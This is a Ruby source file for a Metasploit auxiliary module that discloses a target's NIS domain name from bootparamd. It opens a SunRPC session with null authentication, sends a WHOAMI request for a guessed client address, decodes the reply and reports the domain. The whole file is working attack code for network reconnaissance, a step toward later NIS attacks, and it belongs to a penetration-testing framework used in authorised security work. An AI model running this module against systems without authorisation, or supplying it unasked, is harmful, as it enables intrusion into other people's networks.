##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::SunRPC
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'NIS bootparamd Domain Name Disclosure',
      'Description' => %q{
        This module discloses the NIS domain name from bootparamd.

        You must know a client address from the target's bootparams file.

        Hint: try hosts within the same network range as the target.
      },
      'Author'      => [
        'SATAN',         # boot.c
        'pentestmonkey', # Blog post
        'wvu'            # Metasploit module
      ],
      'References'  => [
        ['URL', 'https://tools.ietf.org/html/rfc1831'],
        ['URL', 'https://tools.ietf.org/html/rfc4506'],
        ['URL', 'http://pentestmonkey.net/blog/nis-domain-name']
      ],
      'License'     => MSF_LICENSE
    ))

    register_options([
      OptEnum.new('PROTOCOL',  [true, 'Protocol to use', 'udp', %w{tcp udp}]),
      OptAddress.new('CLIENT', [true, "Client from target's bootparams file"])
    ])

    register_advanced_options([
      OptFloat.new('XDRTimeout', [true, 'XDR decoding timeout', 10.0])
    ])
  end

  def run
    proto  = datastore['PROTOCOL']
    client = datastore['CLIENT']

    begin
      sunrpc_create(
        proto,  # Protocol: UDP (17)
        100026, # Program: BOOTPARAMS (100026)
        1       # Program Version: 1
      )
    rescue Rex::ConnectionError
      fail_with(Failure::Unreachable, 'Could not connect to portmapper')
    rescue Rex::Proto::SunRPC::RPCError
      fail_with(Failure::Unreachable, 'Could not connect to bootparamd')
    end

    # Flavor: AUTH_NULL (0)
    sunrpc_authnull

    # Convert ASCII to network byte order to four unsigned chars :(
    client_addr = Rex::Socket.addr_aton(client).unpack('C4')

    bootparam_whoami = Rex::Encoder::XDR.encode(
      1,           # Address Type: IPv4-ADDR (1)
      *client_addr # Client Address: [redacted]
    )

    begin
      res = sunrpc_call(
        1,               # Procedure: WHOAMI (1)
        bootparam_whoami # Boot Parameters
      )
    rescue Rex::Proto::SunRPC::RPCError
      fail_with(Failure::NotFound, 'Could not call bootparamd procedure')
    rescue Rex::Proto::SunRPC::RPCTimeout
      fail_with(Failure::NotVulnerable,
                'Could not disclose NIS domain name (try another CLIENT?)')
    ensure
      # Shut it down! Shut it down forever!
      sunrpc_destroy
    end

    unless res
      fail_with(Failure::Unknown, 'No response from server')
    end

    bootparams = begin
      Timeout.timeout(datastore['XDRTimeout']) do
        parse_bootparams(res)
      end
    rescue Timeout::Error
      fail_with(Failure::TimeoutExpired,
                'XDR decoding timed out (try increasing XDRTimeout?)')
    end

    if bootparams.blank?
      fail_with(Failure::Unknown, 'Could not parse bootparams')
    end

    bootparams.each do |host, domain|
      msg = "NIS domain name for host #{host} (#{client}) is #{domain}"

      print_good(msg)

      report_note(
        host:  rhost,
        port:  rport,
        proto: proto,
        type:  'nis.bootparamd.domain',
        data:  msg
      )
    end
  end

  def parse_bootparams(res)
    bootparams = {}

    loop do
      begin
        # XXX: res is modified in place
        host, domain, _, _, _, _, _ = Rex::Encoder::XDR.decode!(
          res,
          String,  # Client Host: [redacted]
          String,  # Client Domain: [redacted]
          Integer, # Address Type: IPv4-ADDR (1)
          # One int per octet in an IPv4 address
          Integer, # Router Address: [redacted]
          Integer, # Router Address: [redacted]
          Integer, # Router Address: [redacted]
          Integer  # Router Address: [redacted]
        )

        break unless host && domain

        bootparams[host] = domain
      rescue Rex::ArgumentError
        vprint_status("Finished XDR decoding at #{res.inspect}")
        break
      end
    end

    bootparams
  end

end
